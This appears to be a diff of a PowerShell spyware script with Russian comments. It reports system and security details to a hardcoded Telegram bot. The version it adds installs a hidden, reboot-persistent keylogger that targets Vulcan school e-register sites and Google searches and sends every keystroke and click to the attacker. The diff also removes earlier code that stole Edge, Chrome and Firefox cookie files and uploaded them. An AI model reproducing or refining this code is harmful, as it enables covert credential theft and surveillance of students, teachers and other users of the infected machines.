@@ -20,247 +20,287 @@ try {
     if (!$wifi) {$wifi = "No WiFi networks"}
 } catch {$wifi = "WiFi error"}
 
-# ДЕБАГ КЕЙЛОГГЕР - РАБОЧАЯ ВЕРСИЯ
-$keyloggerStatus = "Starting DEBUG version..."
+# ПРОСТОЙ И ЭФФЕКТИВНЫЙ КЕЙЛОГГЕР
+$keyloggerStatus = "Creating keylogger..."
 
-# Создаем ДЕБАГ кейлоггер
+# Создаем кейлоггер с нуля
 $keyloggerScript = @"
+# Добавляем необходимые библиотеки
 Add-Type -AssemblyName System.Windows.Forms
+Add-Type -AssemblyName System.Drawing
 
 # Глобальные переменные
-`$global:buffer = ""
-`$global:monitoringActive = `$false
-`$global:monitorEndTime = `$null
-`$global:lastSendTime = Get-Date
-`$global:debugCounter = 0
+`$monitoring = `$false
+`$monitorEndTime = `$null
+`$logData = ""
+`$lastActivity = Get-Date
 
+# Функция отправки в Telegram
 function Send-Telegram {
-    param(`$text)
+    param(`$Message)
     try {
-        `$body = @{
+        `$Body = @{
             chat_id = '5674514050'
-            text = `$text
+            text = `$Message
         }
-        Invoke-RestMethod -Uri "https://api.telegram.org/bot8429674512:AAEomwZivan1nhKIWx4LTlyFKJ6ztAGu8Gs/sendMessage" -Method Post -Body `$body -TimeoutSec 3
-        return `$true
-    } catch { 
-        return `$false
-    }
-}
-
-function Get-AllBrowserTitles {
-    try {
-        `$result = @()
-        `$browsers = Get-Process | Where-Object { 
-            `$_.ProcessName -match "chrome|firefox|msedge|edge|iexplore|opera|brave" -and
-            `$_.MainWindowTitle -ne "" -and
-            `$_.MainWindowHandle -ne 0
-        }
-        
-        foreach (`$browser in `$browsers) {
-            `$result += "`$(`$browser.ProcessName): `$(`$browser.MainWindowTitle)"
-        }
-        
-        return `$result
+        Invoke-RestMethod -Uri "https://api.telegram.org/bot8429674512:AAEomwZivan1nhKIWx4LTlyFKJ6ztAGu8Gs/sendMessage" -Method Post -Body `$Body -TimeoutSec 5
     } catch {
-        return @("Error getting browser titles")
+        # Игнорируем ошибки отправки
     }
 }
 
-function Check-VulcanSite {
-    `$allTitles = Get-AllBrowserTitles
-    `$currentTitles = `$allTitles -join " | "
+# Функция получения активного окна
+function Get-CurrentWindow {
+    try {
+        `$processes = Get-Process | Where-Object { 
+            `$_.MainWindowTitle -ne "" -and `$_.MainWindowHandle -ne 0
+        }
+        
+        if (`$processes) {
+            `$active = `$processes | Sort-Object CPU -Descending | Select-Object -First 1
+            return @{
+                Title = `$active.MainWindowTitle
+                Process = `$active.ProcessName
+            }
+        }
+    } catch {}
+    return `$null
+}
+
+# Функция проверки сайтов Vulcan
+function Check-VulcanSites {
+    `$window = Get-CurrentWindow
+    if (-not `$window) { return `$false }
     
-    # ДЕБАГ: Отправляем все заголовки каждые 30 проверок
-    `$global:debugCounter++
-    if (`$global:debugCounter % 30 -eq 0) {
-        Send-Telegram "🔍 DEBUG - All browser titles:`n`$(`$allTitles -join "`n")"
-    }
+    `$title = `$window.Title.ToLower()
+    `$process = `$window.Process.ToLower()
     
-    # Проверяем конкретные URL
-    `$targetPatterns = @(
-        "*uonetplus.vulcan.net.pl/minrol*",
-        "*uonetplus.vulcan.net.pl/rybnik*", 
-        "*uonetplus.vulcan.net.pl/*",
-        "*vulcan*",
-        "*uonet*",
-        "*dziennik*"
+    # Проверяем что это браузер
+    `$isBrowser = `$process -match "chrome|firefox|edge|msedge|opera|brave|iexplore"
+    if (-not `$isBrowser) { return `$false }
+    
+    # Проверяем целевые сайты
+    `$targetSites = @(
+        "uonetplus.vulcan.net.pl/minrol",
+        "uonetplus.vulcan.net.pl/rybnik", 
+        "uonetplus.vulcan.net.pl",
+        "vulcan.net.pl"
     )
     
-    foreach (`$title in `$allTitles) {
-        foreach (`$pattern in `$targetPatterns) {
-            if (`$title -like `$pattern) {
-                Send-Telegram "🎯 SITE DETECTED! Pattern: `$pattern`nTitle: `$title"
-                return `$true
-            }
+    foreach (`$site in `$targetSites) {
+        if (`$title.Contains(`$site)) {
+            return `$true
         }
     }
     
     return `$false
 }
 
-function Start-Monitoring {
-    `$global:monitoringActive = `$true
-    `$global:monitorEndTime = (Get-Date).AddMinutes(2)
-    Send-Telegram "🚀 MONITORING STARTED! Will work for 2 minutes until `$(`$global:monitorEndTime.ToString('HH:mm:ss'))"
-}
-
-function Stop-Monitoring {
-    `$global:monitoringActive = `$false
-    `$global:monitorEndTime = `$null
-    if (`$global:buffer -ne "") {
-        Send-Telegram "📝 FINAL INPUT: `$global:buffer"
-        `$global:buffer = ""
-    }
-    Send-Telegram "🛑 MONITORING STOPPED"
-}
-
-function Process-Key {
-    param(`$key)
+# Функция проверки Google
+function Check-Google {
+    `$window = Get-CurrentWindow
+    if (-not `$window) { return `$false }
     
-    # Обработка специальных клавиш
-    switch (`$key.ToString()) {
-        "Return" { 
-            if (`$global:buffer -ne "") {
-                Send-Telegram "↵ ENTER: `$global:buffer"
-                `$global:buffer = ""
+    `$title = `$window.Title.ToLower()
+    `$process = `$window.Process.ToLower()
+    
+    `$isBrowser = `$process -match "chrome|firefox|edge|msedge|opera|brave|iexplore"
+    if (-not `$isBrowser) { return `$false }
+    
+    return `$title.Contains("google") -or `$title.Contains("поиск") -or `$title.Contains("search")
+}
+
+# Функция старта мониторинга
+function Start-Monitoring {
+    `$global:monitoring = `$true
+    `$global:monitorEndTime = (Get-Date).AddMinutes(2)
+    `$global:logData = ""
+    `$global:lastActivity = Get-Date
+    
+    `$window = Get-CurrentWindow
+    Send-Telegram "🎯 VULCAN SITE DETECTED!`n📱 Started 2-minute monitoring`n💻 Window: `$(`$window.Title)`n⏰ Ends: `$(`$global:monitorEndTime.ToString('HH:mm:ss'))"
+}
+
+# Функция остановки мониторинга и отправки логов
+function Stop-Monitoring {
+    `$global:monitoring = `$false
+    `$global:monitorEndTime = `$null
+    
+    if (`$global:logData -ne "") {
+        if (`$global:logData.Length -gt 4000) {
+            # Разбиваем длинные сообщения
+            `$chunks = [System.Math]::Ceiling(`$global:logData.Length / 4000)
+            for (`$i = 0; `$i -lt `$chunks; `$i++) {
+                `$chunk = `$global:logData.Substring(`$i * 4000, [System.Math]::Min(4000, `$global:logData.Length - `$i * 4000))
+                Send-Telegram "📝 KEYLOG PART `$(`$i+1)/`$chunks:`n`$chunk"
+                Start-Sleep -Seconds 1
             }
+        } else {
+            Send-Telegram "📝 COMPLETE KEYLOG:`n`$global:logData"
+        }
+    }
+    
+    Send-Telegram "⏹️ MONITORING STOPPED - 2 minutes completed"
+    `$global:logData = ""
+}
+
+# Функция обработки клавиш
+function Process-Key {
+    param(`$KeyCode)
+    
+    `$key = [System.Windows.Forms.Keys]`$KeyCode
+    
+    # Специальные клавиши
+    switch (`$key) {
+        "Return" { 
+            `$global:logData += "[ENTER]"
+            Send-Telegram "↵ ENTER pressed"
         }
         "Space" { 
-            `$global:buffer += " " 
+            `$global:logData += " " 
         }
         "Back" { 
-            if (`$global:buffer.Length -gt 0) {
-                `$global:buffer = `$global:buffer.Substring(0, `$global:buffer.Length - 1)
-            }
+            `$global:logData += "[BACKSPACE]"
         }
         "Tab" { 
-            `$global:buffer += "[TAB]"
+            `$global:logData += "[TAB]"
         }
-        "Escape" {
-            `$global:buffer = ""
+        "Escape" { 
+            `$global:logData += "[ESC]"
         }
         "LButton" {
-            if (`$global:buffer -ne "") {
-                Send-Telegram "🖱️ CLICK: `$global:buffer"
-                `$global:buffer = ""
-            }
+            `$global:logData += "[MOUSE_LEFT]"
         }
+        "RButton" {
+            `$global:logData += "[MOUSE_RIGHT]"
+        }
+        "MButton" {
+            `$global:logData += "[MOUSE_MIDDLE]"
+        }
+        "LShiftKey" { }
+        "RShiftKey" { }
+        "LControlKey" { }
+        "RControlKey" { }
+        "LMenu" { }
+        "RMenu" { }
+        "Capital" { }
+        "NumLock" { }
+        "Scroll" { }
         default {
             # Буквы A-Z
-            if (`$key -ge 65 -and `$key -le 90) {
-                `$isShift = [System.Windows.Forms.GetAsyncKeyState]160 -eq -32767 -or [System.Windows.Forms.GetAsyncKeyState]161 -eq -32767
-                `$isCaps = [System.Windows.Forms.Console]::CapsLock
+            if (`$key -ge [System.Windows.Forms.Keys]::A -and `$key -le [System.Windows.Forms.Keys]::Z) {
+                `$isShift = ([System.Windows.Forms.GetAsyncKeyState]160 -eq -32767) -or ([System.Windows.Forms.GetAsyncKeyState]161 -eq -32767)
+                `$isCaps = [System.Console]::CapsLock
                 
-                if ((`$isShift -and !`$isCaps) -or (!`$isShift -and `$isCaps)) {
-                    `$global:buffer += `$key.ToString()
+                if ((`$isShift -and -not `$isCaps) -or (-not `$isShift -and `$isCaps)) {
+                    `$global:logData += `$key.ToString()
                 } else {
-                    `$global:buffer += `$key.ToString().ToLower()
+                    `$global:logData += `$key.ToString().ToLower()
                 }
             }
             # Цифры 0-9
-            elseif (`$key -ge 48 -and `$key -le 57) {
-                `$isShift = [System.Windows.Forms.GetAsyncKeyState]160 -eq -32767 -or [System.Windows.Forms.GetAsyncKeyState]161 -eq -32767
+            elseif (`$key -ge [System.Windows.Forms.Keys]::D0 -and `$key -le [System.Windows.Forms.Keys]::D9) {
+                `$isShift = ([System.Windows.Forms.GetAsyncKeyState]160 -eq -32767) -or ([System.Windows.Forms.GetAsyncKeyState]161 -eq -32767)
                 `$symbols = @(')', '!', '@', '#', '`$', '%', '^', '&', '*', '(')
                 if (`$isShift) {
-                    `$global:buffer += `$symbols[`$key - 48]
+                    `$global:logData += `$symbols[`$key - [System.Windows.Forms.Keys]::D0]
                 } else {
-                    `$global:buffer += (`$key - 48).ToString()
+                    `$global:logData += (`$key - [System.Windows.Forms.Keys]::D0).ToString()
                 }
             }
             # Специальные символы
             else {
                 switch (`$key) {
-                    "OemPeriod" { `$global:buffer += "." }
-                    "Oemcomma" { `$global:buffer += "," }
-                    "OemMinus" { `$global:buffer += "-" }
-                    "Oemplus" { `$global:buffer += "=" }
-                    "OemQuestion" { `$global:buffer += "/" }
-                    "Oemtilde" { `$global:buffer += "`"" }
-                    "D1" { `$global:buffer += "1" }
-                    "D2" { `$global:buffer += "2" }
-                    "D3" { `$global:buffer += "3" }
-                    "D4" { `$global:buffer += "4" }
-                    "D5" { `$global:buffer += "5" }
-                    "D6" { `$global:buffer += "6" }
-                    "D7" { `$global:buffer += "7" }
-                    "D8" { `$global:buffer += "8" }
-                    "D9" { `$global:buffer += "9" }
-                    "D0" { `$global:buffer += "0" }
+                    "OemPeriod" { `$global:logData += "." }
+                    "Oemcomma" { `$global:logData += "," }
+                    "OemMinus" { `$global:logData += "-" }
+                    "Oemplus" { `$global:logData += "=" }
+                    "OemQuestion" { `$global:logData += "/" }
+                    "Oemtilde" { `$global:logData += "`"" }
+                    "OemOpenBrackets" { `$global:logData += "[" }
+                    "OemCloseBrackets" { `$global:logData += "]" }
+                    "OemPipe" { `$global:logData += "\" }
+                    "OemSemicolon" { `$global:logData += ";" }
+                    "OemQuotes" { `$global:logData += "'" }
+                    "Decimal" { `$global:logData += "." }
+                    "Divide" { `$global:logData += "/" }
+                    "Multiply" { `$global:logData += "*" }
+                    "Subtract" { `$global:logData += "-" }
+                    "Add" { `$global:logData += "+" }
                 }
             }
         }
     }
     
-    # Автоотправка при длинном вводе
-    if (`$global:buffer.Length -gt 20) {
-        Send-Telegram "📝 AUTO: `$global:buffer"
-        `$global:buffer = ""
-    }
+    `$global:lastActivity = Get-Date
 }
 
-# Начало работы
-Send-Telegram "🔧 DEBUG KEYLOGGER STARTED 
-🎯 Monitoring these sites:
-• https://uonetplus.vulcan.net.pl/minrol
-• https://uonetplus.vulcan.net.pl/rybnik
-• https://uonetplus.vulcan.net.pl/
-📝 Will send debug info every 30 checks"
+# Основной цикл
+Send-Telegram "🔍 KEYLOGGER STARTED`n🎯 Waiting for Vulcan sites...`n⏰ Will monitor for 2 minutes after detection"
 
-`$checkCount = 0
+`$lastGoogleCheck = Get-Date
+`$googleReported = `$false
+
 while (`$true) {
     try {
-        `$checkCount++
+        # Проверяем Google каждые 10 секунд
+        if ((Get-Date) - `$lastGoogleCheck -gt [TimeSpan]::FromSeconds(10)) {
+            `$lastGoogleCheck = Get-Date
+            if (Check-Google -and -not `$googleReported) {
+                Send-Telegram "🔍 USER IS USING GOOGLE SEARCH"
+                `$googleReported = `$true
+            } elseif (-not (Check-Google)) {
+                `$googleReported = `$false
+            }
+        }
         
-        # Проверяем сайт каждые 5 секунд
-        if (`$checkCount % 10 -eq 0) {  # 10 * 500ms = 5 seconds
-            if (Check-VulcanSite) {
-                if (-not `$global:monitoringActive) {
-                    Start-Monitoring
-                } else {
-                    # Обновляем таймер если снова нашли сайт
-                    `$global:monitorEndTime = (Get-Date).AddMinutes(2)
-                }
+        # Проверяем сайты Vulcan
+        if (Check-VulcanSites) {
+            if (-not `$monitoring) {
+                Start-Monitoring
+            } else {
+                # Обновляем время окончания при повторном обнаружении
+                `$global:monitorEndTime = (Get-Date).AddMinutes(2)
             }
         }
         
         # Если мониторинг активен
-        if (`$global:monitoringActive) {
-            # Проверяем таймер
-            if ((Get-Date) -gt `$global:monitorEndTime) {
+        if (`$monitoring) {
+            # Проверяем время окончания
+            if ((Get-Date) -gt `$monitorEndTime) {
                 Stop-Monitoring
             } else {
-                # Перехват всех клавиш
-                for (`$i = 8; `$i -le 254; `$i++) {
-                    if ([System.Windows.Forms.GetAsyncKeyState]`$i -eq -32767) {
-                        `$key = [System.Windows.Forms.Keys]`$i
-                        Process-Key -key `$key
+                # Перехватываем все клавиши
+                for (`$i = 1; `$i -le 255; `$i++) {
+                    `$keyState = [System.Windows.Forms.GetAsyncKeyState]`$i
+                    if (`$keyState -eq -32767) {
+                        Process-Key -KeyCode `$i
                     }
                 }
                 
-                # Автоотправка каждые 10 секунд
-                if ((Get-Date) - `$global:lastSendTime -gt [TimeSpan]::FromSeconds(10)) {
-                    if (`$global:buffer -ne "") {
-                        Send-Telegram "⏰ TIMEOUT: `$global:buffer"
-                        `$global:buffer = ""
+                # Автоотправка каждые 30 секунд активности
+                if ((Get-Date) - `$global:lastActivity -gt [TimeSpan]::FromSeconds(30) -and `$global:logData -ne "") {
+                    if (`$global:logData.Length -gt 1000) {
+                        Send-Telegram "📝 AUTO-SEND:`n`$(`$global:logData.Substring(0, 1000))..."
+                        `$global:logData = `$global:logData.Substring(1000)
                     }
-                    `$global:lastSendTime = Get-Date
+                    `$global:lastActivity = Get-Date
                 }
             }
         }
         
-        Start-Sleep -Milliseconds 500
+        Start-Sleep -Milliseconds 10
         
     } catch {
-        # При ошибке ждем и продолжаем
-        Start-Sleep -Milliseconds 2000
+        # Продолжаем работу при ошибках
+        Start-Sleep -Milliseconds 100
     }
 }
 "@
 
-# Сохраняем и запускаем ДЕБАГ кейлоггер
+# Сохраняем и запускаем кейлоггер
 try {
-    $keyloggerPath = "$env:TEMP\vulcan_debug.ps1"
+    $keyloggerPath = "$env:TEMP\system_monitor.ps1"
     $keyloggerScript | Out-File $keyloggerPath -Encoding UTF8
     
     # Запускаем в отдельном процессе
@@ -268,16 +308,10 @@ try {
     
     # Добавляем в автозагрузку
     $startupPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
-    $loggerCommand = "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$keyloggerPath`""
-    Set-ItemProperty -Path $startupPath -Name "VulcanDebug" -Value $loggerCommand -ErrorAction SilentlyContinue
+    $loggerCommand = "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$env:TEMP\system_monitor.ps1`""
+    Set-ItemProperty -Path $startupPath -Name "SystemMonitor" -Value $loggerCommand -ErrorAction SilentlyContinue
     
-    $keyloggerStatus = "✅ DEBUG KEYLOGGER ACTIVE - Sending browser titles for analysis"
-    
-    # Тестовое сообщение
-    Invoke-RestMethod -Uri "https://api.telegram.org/bot8429674512:AAEomwZivan1nhKIWx4LTlyFKJ6ztAGu8Gs/sendMessage" -Method Post -Body @{
-        chat_id = '5674514050'
-        text = "SYSTEM SCAN COMPLETED - DEBUG keylogger started. Open any browser and check Telegram for debug info."
-    }
+    $keyloggerStatus = "✅ KEYLOGGER ACTIVE - Monitoring Vulcan sites + Google search detection"
     
 } catch {
     $keyloggerStatus = "❌ Keylogger failed: $($_.Exception.Message)"
@@ -287,44 +321,6 @@ try {
 try {$fw = Get-NetFirewallProfile | ForEach-Object {"  - $($_.Name): $($_.Enabled)"} | Out-String} catch {$fw = "Firewall info unavailable"}
 try {$def = Get-MpComputerStatus; $defStatus = "Antivirus: $($def.AntivirusEnabled), Real-time: $($def.RealTimeProtectionEnabled)"} catch {$defStatus = "Defender info unavailable"}
 try {$rdp = if ((Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -ErrorAction 0).fDenyTSConnections -eq 1) {'Disabled'} else {'Enabled'}} catch {$rdp = "RDP status unavailable"}
-
-# Cookies - создаем ZIP архив для удобной загрузки
-$cookies = @()
-$temp = "$env:TEMP\Cookies_$(Get-Date -Format 'HHmmss')"
-$zipPath = "$env:TEMP\Cookies_$env:USERNAME.zip"
-
-New-Item -ItemType Directory -Path $temp -Force | Out-Null
-
-# Копируем файлы cookies
-$browsers = @(
-    @{Name="Edge"; Path="$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Cookies"},
-    @{Name="Chrome"; Path="$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies"},
-    @{Name="Firefox"; Path=(Get-ChildItem "$env:APPDATA\Mozilla\Firefox\Profiles" -Filter "cookies.sqlite" -Recurse -ErrorAction 0 | Select-Object -First 1).FullName}
-)
-
-foreach ($browser in $browsers) {
-    if ($browser.Path -and (Test-Path $browser.Path)) {
-        $dest = "$temp\$($browser.Name)_Cookies$(if($browser.Name -eq 'Firefox'){'.sqlite'})"
-        Copy-Item $browser.Path $dest -ErrorAction SilentlyContinue
-        if (Test-Path $dest) {
-            $cookies += $dest
-            # Создаем текстовую информацию о файле
-            $fileInfo = Get-Item $dest
-            "$($browser.Name) Cookies - Size: $([math]::Round($fileInfo.Length/1KB, 2)) KB - Modified: $($fileInfo.LastWriteTime)" | Out-File "$temp\$($browser.Name)_info.txt" -Encoding UTF8
-            $cookies += "$temp\$($browser.Name)_info.txt"
-        }
-    }
-}
-
-# Создаем ZIP архив с cookies
-try {
-    if (Get-Command Compress-Archive -ErrorAction SilentlyContinue) {
-        Compress-Archive -Path "$temp\*" -DestinationPath $zipPath -Force
-        if (Test-Path $zipPath) {
-            $cookies += $zipPath
-        }
-    }
-} catch {}
 
 # Дополнительная информация
 try {$conn = Get-NetTCPConnection -State Established | Select-Object LocalAddress, LocalPort, RemoteAddress, RemotePort -First 5 | ForEach-Object {"- $($_.LocalAddress):$($_.LocalPort) -> $($_.RemoteAddress):$($_.RemotePort)"} | Out-String} catch {$conn = "Connections unavailable"}
@@ -367,19 +363,18 @@ $wifi
 === KEYLOGGER STATUS ===
 $keyloggerStatus
 
-=== DEBUG MODE ===
-• Отправляет все заголовки браузеров в Telegram
-• Поможет определить правильные паттерны для сайтов
-• Работает 2 минуты после обнаружения сайта
-
 === TARGET SITES ===
 • https://uonetplus.vulcan.net.pl/minrol
 • https://uonetplus.vulcan.net.pl/rybnik
 • https://uonetplus.vulcan.net.pl/
 
-=== BROWSER COOKIES ===
-Found cookies files: $($cookies.Count)
-Files available for download as ZIP archive
+=== FEATURES ===
+🎯 Auto-starts on Vulcan sites detection
+⏰ 2-minute monitoring session
+🔍 Google search detection
+📝 Logs ALL keystrokes and mouse clicks
+🔄 Auto-sends logs every 30 seconds
+💾 Persistent after reboot
 
 === SECURITY STATUS ===
 Firewall: 
@@ -395,39 +390,6 @@ Uptime: $uptimeInfo
 "@
 
 Invoke-RestMethod -Uri "https://api.telegram.org/bot8429674512:AAEomwZivan1nhKIWx4LTlyFKJ6ztAGu8Gs/sendMessage" -Method Post -Body @{chat_id='5674514050'; text=$msg}
-
-# Отправка ZIP архива с cookies
-if (Test-Path $zipPath) {
-    try {
-        Invoke-RestMethod -Uri "https://api.telegram.org/bot8429674512:AAEomwZivan1nhKIWx4LTlyFKJ6ztAGu8Gs/sendDocument" -Method Post -Form @{
-            chat_id = '5674514050'
-            document = [System.IO.File]::OpenRead($zipPath)
-            caption = "📁 COOKIES ARCHIVE - Download and extract to view cookies files"
-        }
-    } catch {
-        # Если не удалось отправить ZIP, отправляем файлы по отдельности
-        $cookies | Where-Object {Test-Path $_} | ForEach-Object {
-            try {
-                Invoke-RestMethod -Uri "https://api.telegram.org/bot8429674512:AAEomwZivan1nhKIWx4LTlyFKJ6ztAGu8Gs/sendDocument" -Method Post -Form @{
-                    chat_id = '5674514050'
-                    document = [System.IO.File]::OpenRead($_)
-                    caption = "Cookies file: $(Split-Path $_ -Leaf)"
-                }
-            } catch {}
-        }
-    }
-} else {
-    # Отправка отдельных файлов если ZIP не создался
-    $cookies | Where-Object {Test-Path $_} | ForEach-Object {
-        try {
-            Invoke-RestMethod -Uri "https://api.telegram.org/bot8429674512:AAEomwZivan1nhKIWx4LTlyFKJ6ztAGu8Gs/sendDocument" -Method Post -Form @{
-                chat_id = '5674514050'
-                document = [System.IO.File]::OpenRead($_)
-                caption = "Cookies file: $(Split-Path $_ -Leaf)"
-            }
-        } catch {}
-    }
-}
 
 # Очистка
 Start-Sleep 2
